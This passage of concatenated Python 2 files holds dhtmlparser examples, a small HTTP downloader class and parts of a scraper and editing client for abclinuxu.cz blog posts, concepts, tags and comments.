	HTMLElement("<xe>")
])
"""
Writes:

<xe>
</xe>
"""

#-------------------------------------------------------------------------------

# if not inside container, elements are left unclosed 
print HTMLElement("<xe>")
"""
Writes only:

<xe>
"""#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
DHTMLParserPy example how to find every link in document.
"""

import urllib
import dhtmlparser

f = urllib.urlopen("http://google.com")
data = f.read()
f.close()

dom = dhtmlparser.parseString(data)

for link in dom.find("a"):
	if "href" in link.params:
		print link.params["href"]#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
from dhtmlparser import *

foo = HTMLElement("<xe one='param'>")
baz = HTMLElement('<xe one="param">')

assert foo != baz # references are not the same
assert foo.isAlmostEqual(baz)#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# DHTMLParser DOM creation example.
from dhtmlparser import *

e = HTMLElement("root", [
		HTMLElement("item", {"param1":"1", "param2":"2"}, [
			HTMLElement("<crap>", [
				HTMLElement("hello parser!")
			]),
			HTMLElement("<another_crap/>", {"with" : "params"}),
			HTMLElement("<!-- comment -->")
		]),
		HTMLElement("<item />", {"blank" : "body"})
	])

print e.prettify()

"""
Writes:

<root>
  <item param2="2" param1="1">
    <crap>hello parser!</crap>
    <another_crap with="params" />
    <!-- comment -->
  </item>
  <item blank="body" />
</root>
"""
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = ""
__version = "0.0.1"
__date    = ""
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import spotifier

assert(spotifier.login("xerexe", "xerexexex") == None)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Easy to use downloader library based on urllib/urllib2
by Bystroushaak (bystrousak@kitakitsune.org)

This work is licensed under a Creative Commons Licence
(http://creativecommons.org/licenses/by/3.0/cz/).
"""
# Imports =====================================================================
import urllib
import urllib2



# Variables ===================================================================
# IE 7/Windows XP headers.
IEHeaders = {
	"User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}
# Linux ubuntu x86_64 Firefox 23 headers
LFFHeaders = {
	"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:23.0) Gecko/20100101 Firefox/23.0",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}



#= Functions & objects ========================================================
class Downloader():
	"""
	Lightweight class utilizing downloads from internet.

	Main method: .download()

	Important properties:
		.headers
		.response_headers
		.cookies
		.handle_cookies
	"""

	def __init__(self, headers = None, handle_cookies = True, http_proxy = None):
		"""
		You can set:

		headers -- default IEHeaders, but there is also LFFHeaders
		handle_cookies -- set to false if you don't wish to automatically handle cookies
		http_proxy -- 'url:port' describing HTTP proxy
		"""
		self.headers = headers if headers is not None else IEHeaders
		self.response_headers = None

		self.cookies = {}
		self.handle_cookies = True

		self.http_proxy = None
		if http_proxy is not None:
			self.http_proxy = {'http': http_proxy}


	def download(self, url, get = None, post = None, head = None):
		"""
		Parameters:
		url -- set url to download, automatically adds htt:// if not present
		get -- dict with GET parameters 
		post -- dict with POST parameters
		head -- set to True if you wish to use HEAD request. Returns headers from
		server.
		"""
		# POST params
		if post is not None:
			if type(post) != dict:
				raise TypeError("Unknown type of post paramters.")
			post = urllib.urlencode(post)

		# append GET params to url
		if get is not None:
			if type(get) != dict:
				raise TypeError("Unknown type of get paramters.")
			get = urllib.urlencode(get)
			if "?" in url:
				if url[-1] == "&":
					url += get
				else:
					url += "&" + get
			else:
				url += "?" + get

			get = None

		# check if protocol is specified in |url|
		if not "://" in url:
			url = "http://" + url

		if self.handle_cookies:
			self.__setCookies(url)

		# HEAD request support
		url_req = urllib2.Request(url, post, self.headers)
		if head is not None:
			url_req.get_method = lambda: "HEAD"

		# http proxy support
		opener = None
		if self.http_proxy is None:
			opener = urllib2.build_opener()
		else:
			opener = urllib2.build_opener(urllib2.ProxyHandler(self.http_proxy))

		# download page and save headers from server
		f = opener.open(url_req)
		data = f.read()
		self.response_headers = f.info().items()
		f.close()

		if self.handle_cookies:
			self.__readCookies(url)

		# i suppose I could fix __readCookies() to use dict, but .. meh
		self.response_headers = dict(self.response_headers)

		# head doesn't have content, so return just response headers
		if head is not None:
			return self.response_headers

		return data


	def __setCookies(self, url):
		# add cokies into headers
		domain = self.__getDomain(url)
		if domain in self.cookies.keys():
			cookie_string = ""
			for key in self.cookies[domain].keys():
				cookie_string += key + "=" + str(self.cookies[domain][key]) + "; "

			self.headers["Cookie"] = cookie_string.strip()


	def __readCookies(self, url):
		# simple (and lame) cookie handling
		# parse "set-cookie" string
		cookie_string = ""
		for c in self.response_headers:
			if c[0].lower() == "set-cookie":
				cookie_string = c[1]

		# parse keyword:values
		tmp_cookies = {}
		for c in cookie_string.split(","):
			cookie = c
			if ";" in c:
				cookie = c.split(";")[0]
			cookie = cookie.strip()

			cookie = cookie.split("=")
			keyword = cookie[0]
			value = "=".join(cookie[1:])

			tmp_cookies[keyword] = value

		# append global variable cookis with new cookies
		if len(tmp_cookies) > 0:
			domain = self.__getDomain(url)

			if domain in self.cookies.keys():
				for key in tmp_cookies.keys():
					self.cookies[domain][key] = tmp_cookies[key]
			else:
				self.cookies[domain] = tmp_cookies

		# check for blank cookies
		if len(self.cookies) > 0:
			for domain in self.cookies.keys():
				for key in self.cookies[domain].keys():
					if self.cookies[domain][key].strip() == "":
						del self.cookies[domain][key]

				if len(self.cookies[domain]) == 0:
					del self.cookies[domain]


	def __getDomain(self, url):
		"""
		Parse domain from url.
		"""
		if "://" in url:
			url = url.split("://")[1]

		if "/" in url:
			url = url.split("/")[0]

		return url
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

from httpkie import *#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import dhtmlparser

from shared import first
from shared import download
from shared import url_context
from shared import check_error_div
from shared import check_error_page
from shared import ts_to_concept_date


class Concept(object):
    """
    Attributes:
        title (str): Title of the concept.
        link (str): Absolute URL of the concept.
    """
    def __init__(self, title, link, session):
        self.title = title
        self.link = url_context(link)

        self._meta = None
        self._session = session

    def _init_metadata(self, data=None):
        if not data:
            data = download(self.link, session=self._session)

        if '<div class="s_nadpis">Správa zápisku</div>' not in data:
            raise ValueError(
                "Can't parse metadata! It looks like I am not logged in!"
            )

        data = data.split('<div class="s_nadpis">Správa zápisku</div>')[1]

        dom = dhtmlparser.parseString(data)
        meta_list = first(dom.find("div", {"class": "s_sekce"}))

        self._meta = {}
        for li in meta_list.find("li"):
            a = first(li.find("a"))
            self._meta[a.getContent().strip()] = a.params["href"]

    def get_content(self):
        """
        Get content of this Concept.

        Returns:
            str: full HTML UTF-8 encoded text of the concept.
        """
        data = download(self.link, session=self._session)

        if not self._meta:
            self._init_metadata(data)

        data = first(data.rsplit('<!-- -->', 1))

        # find beginning of the concept text
        dom = dhtmlparser.parseString(data)
        meta_vypis = dom.find("p", {"class": "meta-vypis"})
        if not meta_vypis:
            raise ValueError("Can't find meta-vypis <p>!")

        meta_vypis = first(meta_vypis)
        data = data.split(str(meta_vypis))[1]

        return data.strip()

    def add_pic(self, opened_file):
        """
        Add picture to the Concept.

        Args:
            opened_file (file): opened file object
        """
        # init meta
        if not self._meta:
            self._init_metadata()

        # get link to pic form
        data = download(
            url_context(self._meta["Přidej obrázek"]),
            session=self._session
        )
        dom = dhtmlparser.parseString(data)

        # get information from pic form
        form = first(dom.find("form", {"enctype": "multipart/form-data"}))
        add_pic_url = form.params["action"]

        # send pic
        data = self._session.post(
            url_context(add_pic_url),
            data={
                "action": "addScreenshot2",
                "finish": "Nahrát"
            },
            files={"screenshot": opened_file}
        )
        data = data.text.encode("utf-8")
        check_error_div(data, '<div class="error" id="screenshotError">')

    def list_pics(self):
        """
        Return:
            list: List of URLs to pictures used in this concept.
        """
        # init meta
        if not self._meta:
            self._init_metadata()

        data = download(
            url_context(self._meta["Správa příloh"]),
            session=self._session
        )
        dom = dhtmlparser.parseString(data)

        form = dom.find("form", {"name": "form"})
        assert form, "Can't find pic form!"

        return [
            a.params["href"]
            for a in first(form).find("a")
            if "href" in a.params
        ]

    def edit(self, text, title=None, date_of_pub=None):
        """
        Edit concept.

        Args:
            text (str): New text of the context.
            title (str, default None): New title of the concept. If not set,
                  old title is used.
            date_of_pub (str/int, default None): Date string in abclinuxu
                        format or timestamp determining when the concept should
                        be automatically published.

        Note:
            `date_of_pub` can be string in format ``"%Y-%m-%d %H:%M"``.
        """
        if not self._meta:
            self._init_metadata()

        data = download(
            url_context(self._meta["Uprav zápis"]),
            session=self._session
        )
        dom = dhtmlparser.parseString(data)

        form = dom.find("form", {"name": "form"})

        assert form, "Can't find edit form!"
        form = first(form)

        form_action = form.params["action"]

        if title is None:
            title = first(form.find("input", {"name": "title"}))
            title = title.params["value"]

        date = ""
        if date_of_pub is None:
            date = first(form.find("input", {"name": "publish"}))
            date = date.params["value"]
        elif isinstance(date_of_pub, basestring):
            date = date_of_pub
        else:
            date = ts_to_concept_date(date_of_pub)

        data = download(
            url=url_context(form_action),
            method="POST",
            data={
                "cid": 0,
                "publish": date,
                "content": text,
                "title": title,
                "delay": "Ulož",
                "action": "edit2"
            },
            session=self._session
        )
        check_error_div(data, '<div class="error" id="contentError">')
        check_error_page(data)

    def __str__(self):
        return self.title
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import time

import dhtmlparser as _dhtmlparser  # don't want this at package level

from user import User
from blogpost import Tag
from comment import Comment
from blogpost import Blogpost

import shared as _shared


# Functions & classes =========================================================
def _next_blog_url(start=0):
    """
    Args:
        start (int, default 0): Start at this page.

    Yields:
        str: Another url for blog listing.
    """
    for i in xrange(1000000):
        if i < start:
            continue

        yield _shared.url_context("/blog/?from=%d" % (i * 25))


def _should_continue(dom):
    """
    Detect pagination at the bottom of the bloglist page.

    Returns:
        bool: True if there is another page with list of blogposts.
    """
    paginators = dom.find(
        "a",
        fn=lambda x: x.params.get("href", "").startswith("/blog/?from=")
    )

    next_tags = [x for x in paginators if x.getContent() == "Starší zápisy"]

    return bool(next_tags)


def _remove_crap_from_bloglist(data):
    """
    Clean crap, get just content. This speeds up parsing.

    Args:
        data (str): Content of the bloglist page.

    Returns:
        str: `data` without crap.
    """
    # clean crap, get just content
    data = data.split(
        '<div class="s_nadpis linkbox_nadpis">Píšeme jinde</div>'
    )[0]
    data = data.split('<div class="st" id="st">')[1]

    # some blogs have openning comment in perex, which fucks ups bloglist
    # - this will close comments that goes over bloglist
    data = data.replace(
        '<div class="signature">',
        '<!-- --><div class="signature">'
    )

    return data


def iter_blogposts(start=0, end=None, lazy=True):
    """
    Iterate over blogs. Based at bloglist.

    Args:
        start (int, default 0): Start at this page.
        end (int, default None): End at this page.
        lazy (bool, default True): Initialize :class:`.Blogpost` objects only
             with informations from listings. Don't download full text and
             comments.

    Yields:
        obj: :class:`.Blogpost` objects.
    """
    for cnt, url in enumerate(_next_blog_url(start)):
        data = _shared.download(url)

        data = _remove_crap_from_bloglist(data)

        # parse basic info about all blogs at page
        dom = _dhtmlparser.parseString(data)
        for bcnt, blog in enumerate(dom.findB("div", {"class": "cl"})):
            yield Blogpost.from_html(blog, lazy=lazy)

            # every page has 25 blogposts, but somethimes I am getting more
            if bcnt >= 24:
                break

        # detect end of pagination at the bottom
        if not _should_continue(dom):
            break

        if end is not None and cnt >= end:
            break


def first_blog_page(lazy=True):
    """
    Return content of the first blogpost page.

    Args:
        lazy (bool, default True): Do not download full blog information.

    Returns:
        list: 25 :class:`.Blogpost` objects.
    """
    return list(iter_blogposts(end=0, lazy=lazy))


_search_cache = {}
def _binary_search(low, high, test_fn):
    def cached_test_fn(number):
        if number in _search_cache:
            return _search_cache[number]

        result = test_fn(number)
        _search_cache[number] = result

        return result

    if cached_test_fn(high):
        return high

    center = int((low + high) / 2)

    if cached_test_fn(center):
        return _binary_search(center + 1, high, cached_test_fn)
    else:
        return _binary_search(low, center - 1, cached_test_fn)


def number_of_blog_pages(progress_fn=None):
    """
    Find number of blog pages in listing. Multiply by 25 to find out estimate
    number of blogs.

    You can pass `progress_fn` function to track progress of the binary search.

    Args:
        progress_fn (fn): Function accepting one parameter (current estimate).

    Returns:
        int: Number of published blogposts.
    """
    def test_end_of_bloglist(pagination):
        url = _shared.url_context("/blog/?from=%d" % (pagination * 25))
        data = _shared.download(url)
        dom = _dhtmlparser.parseString(_remove_crap_from_bloglist(data))

        if progress_fn:
            progress_fn(pagination)

        return _should_continue(dom)

    # 807 as of 20.02.2018
    estimated_max_no_blogs = (time.localtime().tm_year - 2000) * 50 + 100

    return _binary_search(0, estimated_max_no_blogs, test_end_of_bloglist)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import time
import copy
from collections import namedtuple

import dhtmlparser
from repoze.lru import lru_cache

from shared import first
from shared import download
from shared import url_context
from shared import parse_timestamp
from comment import Comment


# Blogs so fucked up, that they are not even parsable
COMMENT_BANLIST = {
    "/blog/Strider_BSD_koutek/2006/8/objevil-jsem-ameriku",
}


class Rating(namedtuple("Rating", ["rating", "base"])):
    """
    Container holding informations about rating.

    Attributes:
        rating (int): Percentual rating of the blogpost.
        base (int): How many people voted.
    """
    def __repr__(self):
        return "%s(%d%%@%d)" % (
            self.__class__.__name__,
            self.rating,
            self.base
        )


class Tag(str):
    """
    Each blog may have many tags. This is container for informations about each
    tag.

    Attributes:
        tag (str): Human readable content of the tag.
        norm (str): norm machine-readable version of tag.
    """
    def __new__(self, tag, *args, **kwargs):
        return super(Tag, self).__new__(self, tag)

    def __init__(self, tag, norm=None):
        super(Tag, self).__init__(tag)

        self.tag = tag
        self.norm = norm

    @property
    def url(self):
        return url_context("/stitky/%s" % self.norm)


class Blogpost(object):
    """
    Informations about blogposts.

    Attributes:
        url (str): Absolute URL of the blogpost.
        uid (int): Unique identificator of the blogpost.
        title (str): Tile of the blogpost.
        intro (str): Perex. This is parsed only when returned from
                     :class:`User`.
        text (str): Full text of the blogpost.
        tags (list): List of :class:`Tag` objects.
        rating (obj): :class:`Rating` object with informations about rating.
        has_tux (bool): Does this blog have a tux? Only good blogs get tux.
        comments (list): List of :class:`.Comment` objects. Not used until
                 :meth:`.pull` is called, or `lazy` parameter of
                 :meth:`__init__` is set to ``True``.
        comments_n (int): Number of comments. This information is in some cases
                   known before the blog is parsed, just from perex.
        readed (int): How many times was the blog readed?
        object_ts (int): Timestamp of the creation of this object.
        created_ts (int): Timestamp of the creation of the blogpost.
        last_modified_ts (int): Timestamp of the last modification of blogpost.
    """
    def __init__(self, url, lazy=True, **kwargs):
        """
        Args:
            url (str): Url of the blogpost.
            lazy (bool, default True): True == don't call :meth:`pull` right
                 now.
        """
        self.url = url

        self.uid = None
        self.title = None
        self.intro = None
        self.text = None

        self.rating = None
        self.has_tux = False
        self.comments = []
        self.comments_n = -1
        self.readed = None

        self.object_ts = time.time()
        self.created_ts = None
        self.last_modified_ts = None

        # those are used for caching to speed up parsing
        self._tags = None
        self._dom = None
        self._content_tag = None

        # read parameters from kwargs
        for key, val in kwargs.iteritems():
            if key not in self.__dict__:
                raise TypeError("Unknown parameter `%s`!" % key)

            if key.startswith("_"):
                raise ValueError("You can't set protected/private properties!")

            self.__dict__[key] = val

        if not lazy:
            self.pull()

    @staticmethod
    def _parse_intro(blog, meta, title_tag):
        """
        Parse intro from the `meta` HTML part.
        """
        intro = blog.getContent().replace(str(meta), "")
        intro = intro.replace(str(title_tag), "")

        signature = blog.find("div", {"class": "signature"})
        if signature:
            intro = intro.replace(str(signature[0]), "")

        return dhtmlparser.removeTags(intro.strip()).strip()

    @staticmethod
    def _parse_comments_n(meta):
        """
        Parse number of comments under the blogpost.

        Args:
            meta (str): Meta html from the blogpost body.

        Returns:
            int: Number of comments.
        """
        comments = meta.find("a")[-1].getContent()

        try:
            comments = comments.split("&nbsp;")[1]
        except IndexError:
            return 0

        return int(comments)

    @staticmethod
    def _parse_rating_from_preview(meta):
        """
        Parse rating of the blogpost.

        Args:
            meta (str): Meta html from the blogpost body.

        Returns:
            Rating: :class:`.Rating` object.
        """
        rating = filter(
            lambda x: "Hodnocení:" in x,
            str(meta).splitlines()
        )

        if rating:
            rating = rating[0].strip().replace("(", "")
            rating = rating.split("&nbsp;")

            return Rating(int(rating[1]), int(rating[3]))

    @staticmethod
    def _parse_tags(tags_xml):
        tags_dom = dhtmlparser.parseString(tags_xml)

        # see http://www.abclinuxu.cz/ajax/tags/list for details
        return [
            Tag(tag.params["l"], tag.params["i"])
            for tag in tags_dom.find("s")
        ]

    @staticmethod
    def from_html(html, lazy=True):
        """
        Convert HTML string to :class:`Blogpost` instance.

        Args:
            html (str): Input data.
            lazy (bool, default True): Be lazy (don't pull data by yourself
                 from the site). Call :meth:`pull` for active download of all
                 required informations.

        Returns:
            obj: :class:`Blogpost` instance.
        """
        if not isinstance(html, dhtmlparser.HTMLElement):
            html = dhtmlparser.parseString(html)
            dhtmlparser.makeDoubleLinked(html)

        # support for legacy blogs
        title_tag = html.find("h2", {"class": "st_nadpis"})
        if title_tag:
            title_tag = first(title_tag)
            rel_link = first(title_tag.find("a")).params["href"]
            link = url_context(rel_link)
        else:
            title_tag = first(html.find("h2"))
            link = first(html.find("link", {"rel": "canonical"}))
            link = link.params["href"]

        title = dhtmlparser.removeTags(title_tag).strip()

        # get meta
        meta = html.find("p", {"class": "meta-vypis"})[0]

        blog = Blogpost(url=link, lazy=lazy)

        if lazy:
            blog.title = title
            blog.intro = Blogpost._parse_intro(html, meta, title_tag)
            blog.rating = Blogpost._parse_rating_from_preview(meta)
            blog.created_ts = parse_timestamp(meta)
            blog.comments_n = Blogpost._parse_comments_n(meta)

        return blog

    def _parse_title(self):
        assert self._dom

        title_tag = self._dom.find("title")

        if not title_tag:
            return

        self.title = first(title_tag).getContent()

    def _parse_content_tag(self):
        assert self._dom

        if self._content_tag:
            return self._content_tag

        content_tags = self._dom.find("div", {"class": "st", "id": "st"})
        if not content_tags:
            raise ValueError("Can't find content - is this really blogpost?")

        self._content_tag = first(content_tags)

        if not self._content_tag.isOpeningTag():
            self._content_tag = self._content_tag.parent

        return self._content_tag

    def _parse_text(self):
        content_tag = copy.deepcopy(self._parse_content_tag())

        # this shit is not structured in tree, so the parsing is little bit
        # hard
        h2_tag = first(content_tag.find("h2") + content_tag.find("h1"))
        rating_tag = first(content_tag.find("div", {"class": "rating"}))

        # throw everything until the h2_tag
        h2_parent = h2_tag.parent
        while h2_parent.childs[0] != h2_tag:
            h2_parent.childs.pop(0)

        # throw everything after the rating_tag
        rating_parent = rating_tag.parent
        while rating_parent.childs[-1] != rating_tag:
            rating_parent.childs.pop()

        # throw also the rating
        rating_parent.childs.pop()

        meta_vypis_tag = content_tag.find("p", {"class": "meta-vypis"})
        if meta_vypis_tag:
            content_tag.removeChild(meta_vypis_tag, end_tag_too=True)

        self.text = content_tag.getContent()

    def _parse_uid(self):
        def alt_uid():
            lines = self._dom.__str__().splitlines()

            # fined lines starting with Page.relationID
            # Page.relationID = 412659; -> 412659;
            relation_id = [
                line.split("=", 1)[-1]
                for line in lines
                if line.strip().startswith("Page.relationID")
            ]

            if not relation_id:
                return

            # ` 412659;` -> 412659
            relation_id = relation_id[0].split(";")[0].strip()

            self.uid = int(relation_id)

        content = self._parse_content_tag()
        rating_tags = content.find("div", {"class": "rating"})

        if not rating_tags:
            return alt_uid()

        a_tags = rating_tags[0].find(
            "a",
            fn=lambda x: x.params.get("href", "").startswith("/blog/rating/")
        )

        if not a_tags:
            return alt_uid()

        # <a href="/blog/rating/412659?action=rate&amp;rvalue=0&amp;
        # ticket=805cKn1vvI" target="rating" rel="nofollow">špatné</a>
        # -> /blog/rating/412659
        url = a_tags[0].params["href"].split("?")[0]

        # /blog/rating/412659 -> 412659
        url = url.split("/")[-1]

        # sometimes, there is something like ;jsessionid=bleh at the end
        # 400957;jsessionid=16k4zpu2a663zrcv87fe0zp0d -> 400957
        url = url.split(";")[0].strip()

        self.uid = int(url)

    def _parse_rating(self):
        content = self._parse_content_tag()
        rating_tags = content.find("div", {"class": "rating"})

        if not rating_tags:
            return

        # <span> with voting info
        voting_spans = first(rating_tags).find("span")

        if not voting_spans:
            return

        voting_span = first(voting_spans)

        rating = voting_span.getContent()
        base = voting_span.params.get("title", "0")

        self.rating = Rating(
            rating=int(rating.split()[0]),
            base=int(base.split()[-1]),
        )

    def _parse_meta(self):
        content = self._parse_content_tag()
        meta_vypis_tags = content.find("p", {"class": "meta-vypis"})

        if not meta_vypis_tags:
            return

        meta_vypis_tag = first(meta_vypis_tags)
        has_tux_tags = meta_vypis_tag.find("img", {"class": "blog_digest"})

        if has_tux_tags:
            self.has_tux = True

        # get clean string - another thing which is not semantic at all
        lines = dhtmlparser.removeTags(meta_vypis_tag)

        self.created_ts = parse_timestamp(lines)

        # rest will be picked one by one
        lines = lines.strip().splitlines()

        # parse last modification time
        modified_ts_line = [x for x in lines if "poslední úprava:" in x]
        if modified_ts_line:
            date_string = first(modified_ts_line).split(": ")[-1]
            self.last_modified_ts = parse_timestamp(date_string)

        # parse number of reads
        reads_line = [x for x in lines if "Přečteno:" in x]
        if reads_line:
            reads = first(reads_line).split(":")[-1].split("&")[0]
            self.readed = int(reads)

    @property
    def tags(self):
        if self._tags:
            return self._tags

        return self._get_tags()

    @tags.setter
    def tags(self, new_tags):
        self._tags = new_tags

    def _get_tags(self):
        # parse tags
        tags_url = "/ajax/tags/assigned?rid=%d" % self.uid
        tags_xml = download(url_context(tags_url))
        return self.__class__._parse_tags(tags_xml)

    @property
    @lru_cache(1)
    def relative_url(self):
        # http://abcl.cz/blog/2006/8/bleh#2 -> abcl.cz/blog/2006/8/bleh#2
        address = self.url.split("://")[-1]

        # abcl.cz/blog/2006/8/bleh#2 -> blog/2006/8/bleh#2
        relative_address = address.split("/", 1)[-1]

        # blog/2006/8/bleh#2 -> /blog/2006/8/bleh
        return "/" + relative_address.split("#")[0]

    def pull(self):
        """
        Download page with blogpost. Parse text, comments and everything else.

        Until this is called, following attributes are not known/parsed:

            - :attr:`text`
            - :attr:`tags`
            - :attr:`has_tux`
            - :attr:`comments`
            - :attr:`last_modified_ts`
        """
        data = download(url=self.url)

        # this is because of fucks who forgot to close elements like in this
        # blogpost: https://www.abclinuxu.cz/blog/EmentuX/2005/10/all-in-one
        blog_data, comments_data = data.split('<p class="page_tools">')

        self._dom = dhtmlparser.parseString(blog_data)
        self._content_tag = None
        dhtmlparser.makeDoubleLinked(self._dom)

        self._parse_uid()
        self._parse_title()
        self._parse_text()
        self._parse_rating()
        self._parse_meta()

        self._tags = self._get_tags()

        # there are blogs with fucked up HTML which is basically unparsable
        if self.relative_url not in COMMENT_BANLIST:
            self.comments = Comment.comments_from_html(comments_data)
            self.comments_n = len(self.comments)

        # memory cleanup - this saves a LOT of memory
        self._dom = None
        self._content_tag = None

    def get_image_urls(self):
        """
        Get list of links to all images used in this blog.

        Returns:
            list: List of str containing absolute URL of the image.
        """
        image_links = (
            image_tag.params["src"]
            for image_tag in dhtmlparser.parseString(self.text).find("img")
            if "src" in image_tag.params
        )

        def remote_link(link):
            return link.startswith("http://") or link.startswith("https://")

        return [
            link if remote_link(link) else url_context(link)
            for link in image_links
        ]

    # Tag handlers ============================================================
    @classmethod
    def possible_tags(cls):
        """
        Get list of all possible tags which may be set.

        Returns:
            list: List of :class:`Tag` objects.
        """
        tags_xml = download(url_context("/ajax/tags/list"))

        return cls._parse_tags(tags_xml)

    def add_tag(self, tag):
        """
        Add new tag to the blogpost.

        Args:
            tag (Tag): :class:`Tag` instance. See :class:`possible_tags` for
                list of all possible tags.

        Raises:
            KeyError: In case, that `tag` is not instance of :class:`Tag`.
            ValueError: In case that :attr:`uid` is not set.

        Returns:
            list: List of :class:`Tag` objects.
        """
        if not isinstance(tag, Tag):
            raise KeyError(
                "Tag have instance of Tag and to be from .possible_tags()"
            )

        if not self.uid:
            raise ValueError(
                "Can't assign tag - .uid property not set. Call .pull() or "
                "assign .uid manually."
            )

        tags_xml = download(url_context(
            "/ajax/tags/assign?rid=%d&tagID=%s" % (self.uid, tag.norm)
        ))

        self.tags = self.__class__._parse_tags(tags_xml)

        return self.tags

    def remove_tag(self, tag, throw=False):
        """
        Remove tag from the tags currently assigned to blogpost.

        Args:
            tag (Tag): :class:`Tag` instance. See :class:`possible_tags` for
                list of all possible tags.
            throw (bool): Raise error in case you are trying to remove
                tag that is not assigned to blogpost.

        Raises:
            KeyError: In case, that `tag` is not instance of :class:`Tag`.
            IndexError: In case that you are trying to remove tag which is not
                assigned to blogpost.
            ValueError: In case that :attr:`uid` is not set.

        Returns:
            list: List of :class:`Tag` objects.
        """
        if not isinstance(tag, Tag):
            raise KeyError(
                "Tag have instance of Tag and to be from .tags()"
            )

        if tag not in self.tags:
            if not throw:
                return self.tags

            raise IndexError("Can't remove unassigned tag.")

        if not self.uid:
            raise ValueError(
                "Can't assign tag - .uid property not set. Call .pull() or "
                "assign .uid manually."
            )

        tags_xml = download(url_context(
            "/ajax/tags/unassign?rid=%d&tagID=%s" % (self.uid, tag.norm)
        ))

        self.tags = self.__class__._parse_tags(tags_xml)

        return self.tags

    def __repr__(self):
        return "%s(%s)" % (self.__class__.__name__, self.title)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import copy
from collections import namedtuple

import dhtmlparser
from repoze.lru import lru_cache

from shared import first
from shared import url_context
from shared import date_izolator
from shared import parse_timestamp


class Comment(object):
    """
    Comment representation.

    Note:
        For registered users, the :attr:`username` property contains `real`
        username, which may differ from what you see, but this allows you to
        identify the user.

        This is because registered users can (and do) change their `visible`
        usernames anytime they want.

    Attributes:
        url (str): Absolute URL of the comment.
        text (str): Fulltext of the comment.
        timestamp (int): Date of the publication as timestamp.
        username (str): Username of the poster.
        registered (bool): Was the user registered?
        censored (bool): Is the comment censored? If so, you will need
                 additional parsing of the comment, which is not yet
                 implemented.
        responses (list): List of :class:`Comment` instances responding to this
                  comment.
        response_to (obj): Reference to :class:`Comment` to which you are
                    responding. ``None`` in cases where the object is at the
                    top of the comment tree.
    """
    def __init__(self):
        self._id = None

        self.url = None
        self.text = None
        self.timestamp = None

        self.username = None
        self.registered = False
        self.censored = False

        self.responses = []
        self.response_to = None

    @property
    @lru_cache(1)
    def id(self):
        """
        Returns:
            str: Identification of the comment.
        """
        # http://abclinuxu.cz/blog/msk/2016/8/hlada-sa-linux-embedded-vyvojar
        # doesn't have urls in comments, for fucks sake
        if self.url:
            return self.url.split("#")[-1]

        return self._id

    @staticmethod
    def _izolate_timestamp(head_tag):
        text_elements = head_tag.find(None, fn=lambda x: not x.isTag())

        text_clusters = [str(x).splitlines() for x in text_elements]
        lines = sum(text_clusters, [])  # flattern the list

        return parse_timestamp(lines)

    @staticmethod
    def _izolate_username(head_tag):
        user_tag = head_tag.find(
            "a",
            fn=lambda x: x.params.get("href", "").startswith("/lide/")
        )

        if user_tag:
            user_link = first(user_tag).params["href"]

            # /lide/manasekp -> manasekp
            real_username = user_link.split("/")[2]

            return real_username, True  # registered

        # parse unregistered username from unstructured HTML like:
        #         10.2. 21:53
        #
        #       Tomáškova máma

        str_repr = dhtmlparser.removeTags(head_tag.getContent())

        # remove blank lines
        lines = [x.strip() for x in str_repr.splitlines() if x.strip()]

        # izolate line with time
        line_with_time = first(date_izolator(lines))

        # pick line next to line with time
        username = lines[lines.index(line_with_time) + 1]

        def clean_username(username):
            if username == "Rozbalit":  # no username was found
                return ""

            return username.strip()

        return clean_username(username), False  # unregistered

    @staticmethod
    def _parse_url(head_tag):
        comment_id = head_tag.params["id"]

        # parse full link from
        # <a href="/blog/EditDiscussion/400959;jsessionid=kufis2spplnh6gu671mxq
        # e2j?action=add&amp;dizId=210591&amp;threadId=9">Odpovědět</a>
        response_tag = head_tag.find(
            "a",
            fn=lambda x: x.getContent() == "Odpovědět"
        )

        try:
            response_link = first(response_tag).params["href"]
        except StopIteration:
            return None

        # /blog/EditDiscussion/400959;jsessii... -> /blog/EditDiscussion/400959
        response_link = response_link.split(";")[0]

        # /blog/EditDiscussion/400959?action=a.. -> /blog/EditDiscussion/400959
        response_link = response_link.split("?")[0]

        # /blog/EditDiscussion/400959 -> 400959
        blog_id = first(
            token
            for token in response_link.split("/")
            if token.isdigit()
        )

        return url_context("/blog/show/%s#%s" % (blog_id, comment_id))

    @staticmethod
    def _response_to(head_tag):
        response_to_tag = head_tag.find(
            "a",
            fn=lambda x: x.getContent() == "Výše"
        )

        if not response_to_tag:
            return None

        # <a href="#2" title="...">Výše</a> -> #2
        response_to_link = first(response_to_tag).params["href"]

        # #2 -> 2
        return response_to_link.split("#")[-1]

    @staticmethod
    def _parse_text(body_tag):
        censored = False
        text_tag = body_tag.find("div", {"class": "ds_text"})

        if not text_tag:
            censored = True
            text_tag = body_tag.find("div", {"class": "cenzura"})

        if not text_tag:
            raise ValueError("Can't find comment body!")

        return first(text_tag).getContent().strip(), censored

    @staticmethod
    def _from_head_and_body(head_tag, body_tag, uid=None):
        """
        uid is optional, because it's used only at pages without comment links.
        See http://abclinuxu.cz/blog/msk/2016/8/hlada-sa-linux-embedded-vyvojar
        for details.
